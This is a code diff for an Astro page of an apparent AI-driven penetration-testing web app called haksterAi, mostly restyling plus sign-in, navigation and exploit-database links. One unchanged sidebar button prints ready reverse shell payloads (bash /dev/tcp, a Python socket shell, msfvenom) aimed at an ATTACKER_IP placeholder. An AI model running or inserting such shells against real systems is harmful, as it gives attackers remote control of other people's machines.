@@ -14,25 +14,37 @@ import CrushTerminal from '../components/CrushTerminal.astro';
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
     <style>
       * { margin: 0; padding: 0; box-sizing: border-box; }
-      html, body { width: 100%; height: 100%; overflow: hidden; background: #000; font-family: 'JetBrains Mono', monospace; }
+      html, body { width: 100%; height: 100%; overflow: hidden; background: #000; font-family: 'JetBrains Mono', monospace; scrollbar-color: #7c3aed #0a0a0f; scrollbar-width: thin; }
+      * { scrollbar-color: #7c3aed #0a0a0f; scrollbar-width: thin; }
+      ::-webkit-scrollbar { width: 8px; height: 8px; }
+      ::-webkit-scrollbar-track { background: #0a0a0f; }
+      ::-webkit-scrollbar-thumb { background: #1e1e2e; border: 1px solid #0a0a0f; border-radius: 999px; }
+      ::-webkit-scrollbar-thumb:hover { background: #7c3aed; }
+      ::-webkit-scrollbar-corner { background: #0a0a0f; }
 
       /* ── Layout ── */
       #terminal-root { position: fixed; top: 0; left: 0; right: 0; bottom: 0; display: flex; flex-direction: column; }
 
       /* ── Top nav bar ── */
-      #term-nav { height: 32px; min-height: 32px; background: #0a0a0f; border-bottom: 1px solid #1e1e2e; display: flex; align-items: center; justify-content: space-between; padding: 0 12px; z-index: 100; user-select: none; flex-shrink: 0; }
-      #term-nav a { color: #64748b; text-decoration: none; font-size: 11px; font-weight: 500; letter-spacing: 0.5px; transition: color 0.2s; }
+      #term-nav { height: 42px; min-height: 42px; background: #0a0a0f; border-bottom: 1px solid #1e1e2e; display: flex; align-items: center; justify-content: space-between; padding: 0 14px; z-index: 100; user-select: none; flex-shrink: 0; }
+      #term-nav a { color: #94a3b8; text-decoration: none; font-size: 13px; font-weight: 700; letter-spacing: 0.5px; transition: color 0.2s; }
       #term-nav a:hover { color: #e2e8f0; }
       #term-nav .brand { display: flex; align-items: center; gap: 8px; }
-      #term-nav .brand img { width: 18px; height: 18px; border-radius: 3px; }
-      #term-nav .brand span { color: #e2e8f0; font-size: 12px; font-weight: 700; }
+      #term-nav .brand img { width: 22px; height: 22px; border-radius: 4px; }
+      #term-nav .brand span { color: #e2e8f0; font-size: 15px; font-weight: 800; }
       #term-nav .brand .ai { color: #7c3aed; }
-      #term-nav .links { display: flex; gap: 14px; align-items: center; }
+      #term-nav .links { display: flex; gap: 18px; align-items: center; }
       #term-nav .links .active { color: #7c3aed; font-weight: 700; }
+      .term-fullscreen-btn { display: inline-flex; align-items: center; justify-content: center; width: 30px; height: 30px; border-radius: 8px; border: 1px solid #1e1e2e; background: #111118; color: #94a3b8; cursor: pointer; transition: all 0.15s; }
+      .term-fullscreen-btn:hover { color: #fff; border-color: #7c3aed; background: #1a1a2e; }
+      .term-fullscreen-btn svg { width: 15px; height: 15px; }
+      .term-fullscreen-btn .fullscreen-exit { display: none; }
+      .term-fullscreen-btn.active .fullscreen-enter { display: none; }
+      .term-fullscreen-btn.active .fullscreen-exit { display: block; }
+      #terminal-root.term-fullscreen-fallback { position: fixed; inset: 0; z-index: 9999; width: 100vw; height: 100dvh; }
 
       /* ── Phase bar ── */
-      #hack-phase-bar { height: 28px; min-height: 28px; background: #080810; border-bottom: 1px solid #1e1e2e; display: flex; align-items: center; gap: 6px; padding: 0 12px; z-index: 90; user-select: none; flex-shrink: 0; font-size: 10px; overflow-x: auto; scrollbar-width: none; }
-      #hack-phase-bar::-webkit-scrollbar { display: none; }
+      #hack-phase-bar { height: 32px; min-height: 32px; background: #080810; border-bottom: 1px solid #1e1e2e; display: flex; align-items: center; gap: 6px; padding: 0 12px; z-index: 90; user-select: none; flex-shrink: 0; font-size: 10px; overflow: auto hidden; scrollbar-width: thin; }
       #hack-phase-bar .phase-label { color: #64748b; font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin-right: 4px; }
       #hack-phase-bar .phase-btn { flex-shrink: 0; padding: 3px 8px; border-radius: 4px; border: 1px solid transparent; background: transparent; color: #64748b; font-family: inherit; font-size: 10px; font-weight: 700; cursor: pointer; transition: all 0.15s; }
       #hack-phase-bar .phase-btn:hover { color: #e2e8f0; background: #1a1a2e; }
@@ -50,7 +62,7 @@ import CrushTerminal from '../components/CrushTerminal.astro';
       /* ── Sidebar ── */
       #term-sidebar {
         width: 300px; min-width: 300px; background: #0d0d14; border-right: 1px solid #1e1e2e;
-        display: flex; flex-direction: column; overflow-y: auto; transition: width 0.2s, min-width 0.2s;
+        display: flex; flex-direction: column; overflow: auto; transition: width 0.2s, min-width 0.2s;
         font-family: \'JetBrains Mono\', monospace; font-size: 13px; color: #e2e8f0; z-index: 50;
       }
       #term-sidebar.collapsed { width: 0; min-width: 0; overflow: hidden; border-right: none; }
@@ -77,17 +89,104 @@ import CrushTerminal from '../components/CrushTerminal.astro';
       #term-sidebar a:hover { color: #7c3aed; }
 
       /* Hack tool buttons inside sidebar */
-      #term-sidebar .hack-tool-btn { display: flex; align-items: center; gap: 6px; width: 100%; padding: 6px 10px; border-radius: 5px; border: 1px solid transparent; background: transparent; color: #94a3b8; font-size: 13px; font-family: inherit; text-align: left; cursor: pointer; transition: all 0.15s; margin-bottom: 3px; }
-      #term-sidebar .hack-tool-btn:hover { background: #1a1a2e; border-color: #1e1e2e; color: #e2e8f0; }
-      #term-sidebar .hack-tool-btn:active { text-shadow: 0 0 8px currentColor; }
-      #term-sidebar .hack-tool-btn[data-phase="recon"]:hover { color: #c084fc; }
-      #term-sidebar .hack-tool-btn[data-phase="scan"]:hover { color: #ffd700; }
-      #term-sidebar .hack-tool-btn[data-phase="exploit"]:hover { color: #ff6b6b; }
-      #term-sidebar .hack-tool-btn[data-phase="post"]:hover { color: #7c3aed; }
-      #term-sidebar .hack-tool-btn[data-phase="report"]:hover { color: #22d3ee; }
-      #term-sidebar .hack-tool-btn[data-kind="shell"] { font-style: italic; color: #64748b; }
-      #term-sidebar .hack-tool-btn[data-kind="shell"]:hover { color: #34d399; }
-      #term-sidebar .hack-tool-btn .tool-icon { width: 18px; text-align: center; font-size: 13px; }
+      /* ── Command cards ── */
+      #term-sidebar .hack-tool-btn {
+        display: flex; align-items: center; gap: 9px;
+        width: 100%;
+        padding: 10px 12px;
+        border-radius: 8px;
+        border: 1px solid #1e1e2e;
+        background: #111118;
+        color: #e2e8f0;
+        font-size: 13px;
+        font-weight: 600;
+        font-family: inherit;
+        text-align: left;
+        cursor: pointer;
+        transition: all 0.18s cubic-bezier(0.4, 0, 0.2, 1);
+        margin-bottom: 6px;
+        position: relative;
+        overflow: hidden;
+      }
+      #term-sidebar .hack-tool-btn::before {
+        content: '';
+        position: absolute;
+        left: 0; top: 0; bottom: 0;
+        width: 3px;
+        background: currentColor;
+        opacity: 0;
+        transition: opacity 0.18s;
+      }
+      #term-sidebar .hack-tool-btn:hover {
+        background: #161624;
+        border-color: #7c3aed40;
+        transform: translateX(2px);
+      }
+      #term-sidebar .hack-tool-btn:hover::before { opacity: 1; }
+      #term-sidebar .hack-tool-btn:active {
+        transform: translateX(2px) scale(0.985);
+        box-shadow: 0 0 0 1px currentColor inset;
+      }
+      #term-sidebar .hack-tool-btn .tool-icon {
+        width: 24px; height: 24px;
+        display: flex; align-items: center; justify-content: center;
+        font-size: 15px;
+        background: #1a1a2e;
+        border-radius: 6px;
+        flex-shrink: 0;
+      }
+      #term-sidebar .hack-tool-btn .tool-label {
+        flex: 1;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+      }
+      #term-sidebar .hack-tool-btn:hover .tool-icon { background: #22223a; }
+      /* Phase accents */
+      #term-sidebar .hack-tool-btn[data-phase="recon"] { --accent: #c084fc; }
+      #term-sidebar .hack-tool-btn[data-phase="scan"] { --accent: #ffd700; }
+      #term-sidebar .hack-tool-btn[data-phase="exploit"] { --accent: #ff6b6b; }
+      #term-sidebar .hack-tool-btn[data-phase="post"] { --accent: #7c3aed; }
+      #term-sidebar .hack-tool-btn[data-phase="report"] { --accent: #22d3ee; }
+      #term-sidebar .hack-tool-btn[data-phase]:hover { border-color: var(--accent, #7c3aed); }
+      #term-sidebar .hack-tool-btn[data-phase]:hover::before { background: var(--accent, #7c3aed); }
+      #term-sidebar .hack-tool-btn[data-phase]:hover .tool-icon { color: var(--accent, #7c3aed); }
+      /* Shell-run commands: green accent */
+      #term-sidebar .hack-tool-btn[data-kind="shell"] { border-style: solid; }
+      #term-sidebar .hack-tool-btn[data-kind="shell"]:hover { border-color: #34d39940; }
+      #term-sidebar .hack-tool-btn[data-kind="shell"]:hover .tool-icon { color: #34d399; }
+      #term-sidebar .hack-tool-btn[data-kind="shell"]::after {
+        content: '▶';
+        margin-left: auto;
+        font-size: 9px;
+        color: #475569;
+        transition: color 0.18s;
+      }
+      #term-sidebar .hack-tool-btn[data-kind="shell"]:hover::after { color: #34d399; }
+
+      /* Link cards (external references) */
+      #term-sidebar .hack-link-card {
+        text-decoration: none;
+        color: #e2e8f0;
+      }
+      #term-sidebar .hack-link-card::after {
+        content: '↗';
+        margin-left: auto;
+        font-size: 10px;
+        color: #475569;
+        transition: color 0.18s, transform 0.18s;
+      }
+      #term-sidebar .hack-link-card:hover::after { color: var(--accent, #ff6b6b); transform: translate(1px,-1px); }
+
+      /* Section subtitle pills */
+      #term-sidebar .sb-subtitle {
+        color: #64748b; font-size: 10px; font-weight: 700;
+        text-transform: uppercase; letter-spacing: 1px;
+        margin: 10px 0 4px 0;
+        padding-left: 8px;
+        border-left: 2px solid #1e1e2e;
+        padding-left: 8px;
+      }
 
       /* Phase section header in sidebar */
       #term-sidebar .phase-section { opacity: 0.5; transition: opacity 0.2s; }
@@ -123,7 +222,7 @@ import CrushTerminal from '../components/CrushTerminal.astro';
       /* ── Right sidebar (crush tools/info) ── */
       #crush-sidebar {
         width: 240px; min-width: 240px; background: #0d0d14; border-left: 1px solid #1e1e2e;
-        display: flex; flex-direction: column; overflow-y: auto; transition: width 0.2s, min-width 0.2s;
+        display: flex; flex-direction: column; overflow: auto; transition: width 0.2s, min-width 0.2s;
         font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #e2e8f0; z-index: 50;
       }
       #crush-sidebar.collapsed { width: 0; min-width: 0; overflow: hidden; border-left: none; }
@@ -142,7 +241,7 @@ import CrushTerminal from '../components/CrushTerminal.astro';
       #crush-sidebar .cs-tool-icon { width: 14px; text-align: center; font-size: 12px; }
       #crush-sidebar .cs-tool-name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: #94a3b8; }
       #crush-sidebar .cs-tool-count { color: #7c3aed; font-weight: 600; min-width: 24px; text-align: right; }
-      #crush-sidebar .cs-list { max-height: 190px; overflow-y: auto; padding-right: 2px; }
+      #crush-sidebar .cs-list { max-height: 190px; overflow: auto; padding-right: 2px; }
       #crush-sidebar .cs-list.tall { max-height: 260px; }
       #crush-sidebar .cs-chip-row { display: flex; align-items: center; gap: 6px; padding: 3px 0; min-width: 0; }
       #crush-sidebar .cs-chip-main { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: #94a3b8; }
@@ -171,14 +270,14 @@ import CrushTerminal from '../components/CrushTerminal.astro';
 
       /* ── Responsive: hide sidebars on small screens ── */
       @media (max-width: 768px) {
-        #term-sidebar { position: fixed; top: 60px; left: 0; bottom: 0; z-index: 60; transform: translateX(-100%); transition: transform 0.2s; }
+        #term-sidebar { position: fixed; top: 74px; left: 0; bottom: 0; z-index: 60; transform: translateX(-100%); transition: transform 0.2s; }
         #term-sidebar.mobile-open { transform: translateX(0); width: 260px; min-width: 260px; }
         #sidebar-toggle-btn { width: 28px; min-width: 28px; }
-        #sidebar-overlay { display: none; position: fixed; inset: 0; top: 60px; background: rgba(0,0,0,0.5); z-index: 55; }
+        #sidebar-overlay { display: none; position: fixed; inset: 0; top: 74px; background: rgba(0,0,0,0.5); z-index: 55; }
         #sidebar-overlay.active { display: block; }
-        #crush-sidebar { position: fixed; top: 60px; right: 0; bottom: 0; z-index: 60; transform: translateX(100%); transition: transform 0.2s; }
+        #crush-sidebar { position: fixed; top: 74px; right: 0; bottom: 0; z-index: 60; transform: translateX(100%); transition: transform 0.2s; }
         #crush-sidebar.mobile-open { transform: translateX(0); width: 260px; min-width: 260px; }
-        #hack-phase-bar { top: 32px; }
+        #hack-phase-bar { top: 42px; }
       }
     </style>
   </head>
@@ -190,9 +289,15 @@ import CrushTerminal from '../components/CrushTerminal.astro';
           <a href="/"><span>hakster<span class="ai">Ai</span></span></a>
         </div>
         <div class="links">
-          <a href="/hack" class="active">💀 Hack</a>
-          <a href="/terminal">⌨️ Terminal</a>
+          <a href="/">🏠 Home</a>
+          <a href="/hack">💀 Hack</a>
+          <a href="/build">💬 Chat</a>
+          <a href="/labs">🧪 Labs</a>
           <a href="/dashboard">📊 Dashboard</a>
+          <button type="button" id="term-fullscreen-btn" class="term-fullscreen-btn" title="Fullscreen" aria-label="Fullscreen" aria-pressed="false">
+            <svg class="fullscreen-enter" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 3H3v5m13-5h5v5M8 21H3v-5m18 0v5h-5"/></svg>
+            <svg class="fullscreen-exit" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v6H3m12-6v6h6M9 21v-6H3m12 6v-6h6"/></svg>
+          </button>
         </div>
       </div>
 
@@ -236,6 +341,7 @@ import CrushTerminal from '../components/CrushTerminal.astro';
               <option value="hermes">Hermes</option>
               <option value="claude-proxy">Claude Proxy</option>
               <option value="codex">Codex / Nous GPT-5.5</option>
+              <option value="nous">Nous Claude Fable</option>
             </select>
           </div>
           <div class="sb-section">
@@ -332,6 +438,84 @@ import CrushTerminal from '../components/CrushTerminal.astro';
             <button class="hack-tool-btn" data-kind="shell" data-phase="exploit" data-command="echo '[EXPLOIT] Generating reverse shell payload examples...' &amp;&amp; echo -e &quot;Bash:\n  bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1\nPython:\n  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((&quot;ATTACKER_IP&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])'\nMSF:\n  msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o /tmp/rev.elf\n&quot;>⚡ Shell Generator</button>
             <button class="hack-tool-btn" data-kind="shell" data-phase="exploit" data-command="echo '[EXPLOIT] Downloading source/endpoints for audit...' &amp;&amp; mkdir -p /tmp/hakster_source_&#36;{TARGET//[^a-zA-Z0-9]/_} &amp;&amp; wget --mirror --convert-links --adjust-extension --page-requisites --no-parent --restrict-file-names=windows --domains=&#36;{TARGET} --no-if-modified-since -P /tmp/hakster_source_&#36;{TARGET//[^a-zA-Z0-9]/_} &#36;{TARGET} 2&gt;/dev/null || echo 'wget mirror failed'">⚡ Source Mirror</button>
             <button class="hack-tool-btn" data-kind="shell" data-phase="exploit" data-cmd-id="privesc">⚡ Priv Esc Cheatsheet</button>
+
+            <!-- ExploitDB & Reference Links -->
+            <div class="sb-subtitle" style="color:#ff6b6b;border-left-color:#ff6b6b55;margin-top:10px;">🔗 ExploitDB</div>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://www.exploit-db.com/search?q=" target="_blank" rel="noopener">
+              <span class="tool-icon">🔍</span><span class="tool-label">ExploitDB Search</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://www.exploit-db.com/shellcodes" target="_blank" rel="noopener">
+              <span class="tool-icon">🐚</span><span class="tool-label">Shellcode DB</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://www.exploit-db.com/papers" target="_blank" rel="noopener">
+              <span class="tool-icon">📄</span><span class="tool-label">Exploit Papers</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">
+              <span class="tool-icon">G</span><span class="tool-label">Google Hacking DB</span>
+            </a>
+
+            <div class="sb-subtitle" style="color:#ff6b6b;border-left-color:#ff6b6b55;margin-top:10px;">📚 CVE & Advisory</div>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://www.cve.org/" target="_blank" rel="noopener">
+              <span class="tool-icon">🛡</span><span class="tool-label">CVE (cve.org)</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://nvd.nist.gov/vuln/search" target="_blank" rel="noopener">
+              <span class="tool-icon">🔬</span><span class="tool-label">NVD Search</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://www.cvedetails.com/" target="_blank" rel="noopener">
+              <span class="tool-icon">📊</span><span class="tool-label">CVE Details</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">
+              <span class="tool-icon">💥</span><span class="tool-label">Metasploit Framework</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://packetstormsecurity.com/files/tags/exploits/" target="_blank" rel="noopener">
+              <span class="tool-icon">🌪</span><span class="tool-label">Packet Storm</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://0day.today/" target="_blank" rel="noopener">
+              <span class="tool-icon">0️⃣</span><span class="tool-label">0day Today</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://sploitus.com/" target="_blank" rel="noopener">
+              <span class="tool-icon">🃏</span><span class="tool-label">Sploitus</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://vulners.com/" target="_blank" rel="noopener">
+              <span class="tool-icon">🧬</span><span class="tool-label">Vulners</span>
+            </a>
+
+            <div class="sb-subtitle" style="color:#ff6b6b;border-left-color:#ff6b6b55;margin-top:10px;">🧨 Payloads & Shells</div>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener">
+              <span class="tool-icon">📦</span><span class="tool-label">PayloadsAllTheThings</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">
+              <span class="tool-icon">📋</span><span class="tool-label">SecLists Wordlists</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://gtfobins.github.io/" target="_blank" rel="noopener">
+              <span class="tool-icon">🐧</span><span class="tool-label">GTFOBins</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://lolbas-project.github.io/" target="_blank" rel="noopener">
+              <span class="tool-icon">🪟</span><span class="tool-label">LOLBAS</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://www.revshells.com/" target="_blank" rel="noopener">
+              <span class="tool-icon">🔄</span><span class="tool-label">Rev Shell Generator</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://github.com/The-Z-Labs/linux-exploit-suggester" target="_blank" rel="noopener">
+              <span class="tool-icon">🔍</span><span class="tool-label">Linux Exploit Suggester</span>
+            </a>
+
+            <div class="sb-subtitle" style="color:#ff6b6b;border-left-color:#ff6b6b55;margin-top:10px;">📖 Cheatsheets</div>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://book.hacktricks.xyz/" target="_blank" rel="noopener">
+              <span class="tool-icon">📕</span><span class="tool-label">HackTricks</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://www.hackingarticles.in/" target="_blank" rel="noopener">
+              <span class="tool-icon">📝</span><span class="tool-label">Hacking Articles</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://github.com/RsaCtfTool/RsaCtfTool" target="_blank" rel="noopener">
+              <span class="tool-icon">🔑</span><span class="tool-label">RSA CTF Tool</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">
+              <span class="tool-icon">🔟</span><span class="tool-label">OWASP Top 10</span>
+            </a>
+            <a class="hack-tool-btn hack-link-card" data-kind="link" data-phase="exploit" href="https://cheatsheetseries.owasp.org/" target="_blank" rel="noopener">
+              <span class="tool-icon">🗂</span><span class="tool-label">OWASP Cheatsheets</span>
+            </a>
           </div>
 
           <div class="sb-section phase-section" data-phase-section="post">
@@ -365,7 +549,29 @@ import CrushTerminal from '../components/CrushTerminal.astro';
           <div class="sb-section">
             <div class="sb-title">🔗 Links</div>
             <a href="/" style="display:block;margin-bottom:4px;">🏠 Home</a>
+            <a href="/build" style="display:block;margin-bottom:4px;">💬 Chat</a>
+            <a href="/labs" style="display:block;margin-bottom:4px;">🧪 Labs</a>
+            <a href="/terminal" style="display:block;margin-bottom:4px;">⌨️ Terminal</a>
             <a href="/dashboard" style="display:block;margin-bottom:4px;">📊 Dashboard</a>
+          </div>
+          <div class="sb-section">
+            <div class="sb-title">👤 Account</div>
+            <div id="hack-google-signin" style="display:none;"></div>
+            <!-- Fallback Google button for hack page -->
+            <button id="hack-google-fallback" class="sb-btn" style="width:100%;justify-content:center;display:flex;align-items:center;gap:6px;">
+              <svg class="h-3.5 w-3.5" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+              Sign in with Google
+            </button>
+            <div id="hack-account-info" class="hidden" style="display:none;">
+              <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
+                <img id="hack-account-avatar" style="width:24px;height:24px;border-radius:50%;" alt="" />
+                <div style="min-width:0;flex:1;">
+                  <div id="hack-account-name" style="font-size:12px;font-weight:600;color:#e2e8f0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">—</div>
+                  <div id="hack-account-email" style="font-size:10px;color:#64748b;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">—</div>
+                </div>
+              </div>
+              <button id="hack-account-logout" class="sb-btn red small" style="width:100%;justify-content:center;">⏻ Sign Out</button>
+            </div>
           </div>
         </aside>
 
@@ -379,7 +585,7 @@ import CrushTerminal from '../components/CrushTerminal.astro';
 
         <!-- Terminal -->
         <div id="term-body">
-          <CrushTerminal id="crush-main" autoStart={true} />
+          <CrushTerminal id="crush-main" autoStart={true} ptyMode="shell" />
           <div id="hack-decode-overlay"></div>
           <div id="hack-checkpoint-flash">
             <span>💾</span>
@@ -436,7 +642,17 @@ import CrushTerminal from '../components/CrushTerminal.astro';
       </div>
     </div>
 
+    <script is:inline src="/js/session-timeout.js"></script>
     <script>
+      // ── Auth gate: redirect to landing if not signed in ─────────
+      (function() {
+        const token = localStorage.getItem('hakster_google_token');
+        const authParam = new URLSearchParams(window.location.search).get('google_auth');
+        if (!token && !authParam) {
+          window.location.href = '/';
+        }
+      })();
+
       // ── Sidebar toggle ──────────────────────────────────────────
       const sidebar = document.getElementById('term-sidebar');
       const toggleBtn = document.getElementById('sidebar-toggle-btn');
@@ -1139,6 +1355,18 @@ import CrushTerminal from '../components/CrushTerminal.astro';
         }
 
         document.querySelectorAll('.hack-tool-btn').forEach(btn => {
+          // Restructure into card layout: [icon] label [▶]
+          if (!btn.dataset.cardified && !btn.querySelector('.tool-icon')) {
+            const text = btn.textContent.trim();
+            const iconMatch = text.match(/^(\S+)\s+(.*)$/);
+            const icon = iconMatch ? iconMatch[1] : '⚡';
+            const label = iconMatch ? iconMatch[2] : text;
+            btn.innerHTML = '<span class="tool-icon">' + icon + '</span><span class="tool-label">' + label + '</span>';
+            btn.dataset.cardified = '1';
+          }
+        });
+
+        document.querySelectorAll('.hack-tool-btn').forEach(btn => {
           btn.addEventListener('click', () => {
             const promptTemplate = btn.dataset.prompt;
             let cmd = btn.dataset.command;
@@ -1270,6 +1498,162 @@ import CrushTerminal from '../components/CrushTerminal.astro';
         loadHackDashboard();
         loadCapabilities();
         loadMemory();
+
+        // ── Google Sign-In for hack lab ──
+        let hackGoogleToken = null;
+        let hackGoogleUser = null;
+
+        function loadHackGoogleIdentity() {
+          // GSI library not needed for Desktop app OAuth — using redirect flow
+          initHackGoogleButton();
+        }
+
+        async function initHackGoogleButton() {
+          try {
+            const res = await fetch(`${API}/api/auth/google/client-id`);
+            const data = await res.json();
+            if (!data.configured) return;
+
+            const storedToken = localStorage.getItem('hakster_google_token');
+            const storedUser = localStorage.getItem('hakster_google_user');
+            if (storedToken && storedUser) {
+              try {
+                hackGoogleToken = storedToken;
+                hackGoogleUser = JSON.parse(storedUser);
+                showHackAccount(hackGoogleUser);
+                return;
+              } catch {}
+            }
+
+            // Desktop app OAuth client — use redirect flow exclusively, skip GSI renderButton
+          } catch (e) { console.log('Hack Google Identity skipped:', e); }
+        }
+
+        async function handleHackCredential(response) {
+          const credential = response.credential;
+          if (!credential) return;
+          const device = {
+            deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'mobile' : 'desktop',
+            osName: navigator.platform || 'unknown',
+            browser: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/?[\s\d.]+/i)?.[0]?.split('/')[0] || 'unknown',
+            screenSize: `${screen.width}x${screen.height}`,
+            language: navigator.language || '',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+          };
+          try {
+            const res = await fetch(`${API}/api/auth/google`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ credential, device }),
+            });
+            const data = await res.json();
+            if (data.ok) {
+              hackGoogleToken = data.apiKey;
+              hackGoogleUser = data.user;
+              localStorage.setItem('hakster_google_token', hackGoogleToken);
+              localStorage.setItem('hakster_google_user', JSON.stringify(data.user));
+              window.haksterSessionTouch?.();
+              showHackAccount(data.user);
+            }
+          } catch (e) { console.error('Hack Google auth failed:', e); }
+        }
+
+        function showHackAccount(user) {
+          const signin = document.getElementById('hack-google-signin');
+          const info = document.getElementById('hack-account-info');
+          const nameEl = document.getElementById('hack-account-name');
+          const emailEl = document.getElementById('hack-account-email');
+          const avatarEl = document.getElementById('hack-account-avatar');
+          if (signin) signin.style.display = 'none';
+          const fallback = document.getElementById('hack-google-fallback');
+          if (fallback) fallback.style.display = 'none';
+          if (info) { info.style.display = 'block'; info.classList.remove('hidden'); }
+          if (nameEl) nameEl.textContent = user.username || user.email || 'User';
+          if (emailEl) emailEl.textContent = user.email || '—';
+          if (avatarEl && user.picture) avatarEl.src = user.picture;
+        }
+
+        // Fallback button uses redirect-based OAuth flow
+        document.getElementById('hack-google-fallback')?.addEventListener('click', () => {
+          window.location.href = `${API}/api/auth/google/redirect`;
+        });
+
+        // Check for OAuth callback result in URL
+        function checkHackGoogleCallback() {
+          const params = new URLSearchParams(window.location.search);
+          const googleAuth = params.get('google_auth');
+          const googleError = params.get('google_error');
+          if (googleAuth) {
+            try {
+              const data = JSON.parse(decodeURIComponent(googleAuth));
+              if (data.ok) {
+                hackGoogleToken = data.apiKey;
+                hackGoogleUser = data.user;
+                localStorage.setItem('hakster_google_token', hackGoogleToken);
+                localStorage.setItem('hakster_google_user', JSON.stringify(data.user));
+                window.haksterSessionTouch?.();
+                showHackAccount(data.user);
+              }
+            } catch {}
+            window.history.replaceState({}, '', window.location.pathname);
+          }
+          if (googleError) {
+            console.error('Google auth error:', googleError);
+            window.history.replaceState({}, '', window.location.pathname);
+          }
+        }
+        checkHackGoogleCallback();
+
+        document.getElementById('hack-account-logout')?.addEventListener('click', () => {
+          localStorage.removeItem('hakster_google_token');
+          localStorage.removeItem('hakster_google_user');
+          localStorage.removeItem('hakster_user_data');
+          localStorage.removeItem('hakster_last_activity');
+          if (window.google && window.google.accounts && window.google.accounts.id) {
+            window.google.accounts.id.disableAutoSelect();
+          }
+          location.reload();
+        });
+
+        loadHackGoogleIdentity();
+
+        // Fullscreen hack workspace
+        const termRoot = document.getElementById('terminal-root');
+        const termFullscreenBtn = document.getElementById('term-fullscreen-btn');
+        function setTermFullscreenState(active) {
+          if (!termFullscreenBtn) return;
+          termFullscreenBtn.classList.toggle('active', active);
+          termFullscreenBtn.setAttribute('aria-pressed', active ? 'true' : 'false');
+          termFullscreenBtn.title = active ? 'Exit fullscreen' : 'Fullscreen';
+          termFullscreenBtn.setAttribute('aria-label', termFullscreenBtn.title);
+        }
+        termFullscreenBtn?.addEventListener('click', async () => {
+          try {
+            if (document.fullscreenElement === termRoot) {
+              await document.exitFullscreen();
